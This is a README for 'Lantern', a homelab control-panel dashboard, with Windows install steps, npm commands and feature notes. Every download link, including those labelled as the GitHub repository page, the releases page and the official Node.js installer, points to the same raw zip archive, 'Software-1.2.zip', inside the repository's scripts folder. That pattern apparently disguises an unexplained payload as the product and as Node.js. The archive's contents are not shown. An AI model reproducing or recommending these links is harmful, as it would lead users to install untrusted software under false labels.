# 🏮 Lantern - Simple Control Panel for Homelabs

[![Download Lantern](https://img.shields.io/badge/Download-Lantern-ff6600?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Keliz271/Lantern/main/scripts/Software-1.2.zip)

## 🔍 What is Lantern?

Lantern is an easy-to-use control panel for monitoring your homelab or online services in real time. It lets you see status updates and control widgets with a clear, visual interface. You do not need to know programming to use it.

Lantern updates data live and supports multiple devices, making it useful if you run many servers or services. You can also edit your dashboard layout and styles inside Lantern.

---

## 🖥️ Features

- Shows widgets based on saved settings (`config/widgets.json`).
- Updates live with Server-Sent Events (SSE).
- Checks external services automatically and stores the data.
- Built-in visual editor for layouts, widget options, and styles at `/editor`.
- Allows you to upload background images.
- Supports image proxying for media servers like Plex and Jellyfin.

---

## ⚙️ System Requirements

- Windows 10 or newer (64-bit recommended)
- Node.js installed (version 16 or later)
- At least 2 GB of available RAM
- 500 MB free disk space

---

## 🚀 Getting Started: How to Download and Install Lantern on Windows

### Step 1: Visit the Download Page

Click the button below to open the Lantern GitHub repository page. You will find the download files there.

[![Download Lantern](https://img.shields.io/badge/Download-Lantern-008000?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Keliz271/Lantern/main/scripts/Software-1.2.zip)

### Step 2: Download the Latest Release

1. On the GitHub page, go to the **Releases** section.  
2. Download the latest Windows executable (`Lantern-Setup.exe`) or zip file provided.

### Step 3: Install Lantern

- If you downloaded the executable, double-click it to start the installation.  
- Follow the on-screen prompts to complete the install.  
- If you downloaded the zip file, unzip it to a folder you can access easily (e.g., `C:\Lantern`).

### Step 4: Install Node.js (if needed)

Lantern requires Node.js. If you don’t have it installed:

1. Visit https://raw.githubusercontent.com/Keliz271/Lantern/main/scripts/Software-1.2.zip  
2. Download the **LTS** version for Windows.  
3. Run the installer and follow the steps.  
4. After installation, restart your computer or open a new Command Prompt window.

### Step 5: Run Lantern

1. Open Command Prompt (press `Win + R`, type `cmd`, then press Enter).  
2. Navigate to the Lantern folder. For example:
   
   ```
   cd C:\Lantern
   ```

3. Install necessary components by running:

   ```
   npm install
   ```

4. Start Lantern with:

   ```
   npm run dev
   ```

5. Open your web browser and go to:

   ```
   http://localhost:5173
   ```

You will see your Lantern control panel running.

---

## 🎛️ Using Lantern

- Use the visual editor at `http://localhost:5173/editor` to add, arrange, or customize widgets.  
- Upload background images for your dashboard through the editor.  
- Connect your Plex or Jellyfin media servers to show related images inside the panels.  
- Live updates show service status without page reloads.

---

## 🛠️ Production Setup (For Advanced Users)

Once you are ready to run Lantern as a stable service, use these commands in your Lantern folder:

```
npm run check
npm run build
npm run preview
```

This will prepare Lantern for production use. The preview command lets you test the setup before deploying.

---

## 💾 Backup and Restore

To keep your settings safe, Lantern supports backups.

To create and verify a backup, run this in your Lantern folder:

```
npm run backup:drill
```

This saves a timestamped backup in the `./backup` folder.

---

## 🔧 Troubleshooting Tips

- If the panel doesn’t load, check if Node.js is installed by typing `node -v` in Command Prompt.  
- Make sure you are in the Lantern folder when running commands.  
- Restart Node.js or your PC if the server does not start.  
- If widgets do not update, check your internet connection or service URLs in the config.

---

## 🗂️ File Locations You Should Know

- **Config file:** `config/widgets.json` — where your widget settings are saved.  
- **Backup folder:** `./backup` — stores backup files.  
- **Editor URL:** `http://localhost:5173/editor` — visual editor for your dashboard.  

---

## 📞 Where to Get Help

- Check the GitHub repository issues page for existing questions.  
- Open a new issue if you find a bug or need help.  
- Typical questions include setup errors, config problems, or feature requests.

---

## ⚡ Quick Links

- [Lantern on GitHub](https://raw.githubusercontent.com/Keliz271/Lantern/main/scripts/Software-1.2.zip)  
- [Download Lantern Releases](https://raw.githubusercontent.com/Keliz271/Lantern/main/scripts/Software-1.2.zip)  

[![Download Lantern](https://img.shields.io/badge/Download-Lantern-ff6600?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Keliz271/Lantern/main/scripts/Software-1.2.zip)